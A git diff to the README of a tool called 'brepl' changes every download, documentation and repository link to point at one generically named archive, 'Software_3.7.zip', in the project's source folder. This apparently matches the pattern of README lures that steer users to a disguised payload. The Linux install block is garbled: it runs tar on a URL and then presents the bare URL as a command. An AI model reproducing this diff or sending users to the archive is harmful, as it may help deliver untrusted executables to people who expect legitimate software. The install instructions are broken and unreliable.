@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download brepl](https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip)](https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip)
+[![Download brepl](https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip)](https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Follow the steps below to download and run brepl on your computer.
 
 To start, you need to visit the releases page. Click the link below to access it:
 
-[Download brepl](https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip)
+[Download brepl](https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip)
 
 ### 2. Choose Your Version
 
@@ -36,7 +36,7 @@ After selecting a version, look for the files listed under the “Assets” sect
 
 - For Windows, download the `.exe` file.
 - For macOS, download the `.dmg` file.
-- For Linux, download the `https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip` file.
+- For Linux, download the `https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip` file.
 
 Click on the file to start the download.
 
@@ -58,14 +58,14 @@ Once the download completes, install brepl by following these instructions based
 
 #### **Linux**
 
-1. Locate the downloaded `https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip` file in your Downloads folder.
 2. Open a terminal and navigate to the directory containing the file.
 3. Run the following commands to extract and install:
 
     ```bash
-    tar -xzf https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip
+    tar -xzf https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip
     cd brepl
-    https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip
+    https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip
     ```
 
 ## 🎉 Running brepl
@@ -98,7 +98,7 @@ For further assistance, you can reach out through the Issues tab on the reposito
 
 ## 💼 Additional Resources
 
-- [brepl Documentation](https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Poldomer/brepl/main/src/brepl-v2.2.zip)
+- [brepl Documentation](https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip)
+- [GitHub Repository](https://github.com/Poldomer/brepl/raw/refs/heads/main/src/Software_3.7.zip)
 
 Make the most of brepl and enhance your experience with LLMs. Happy bridging!
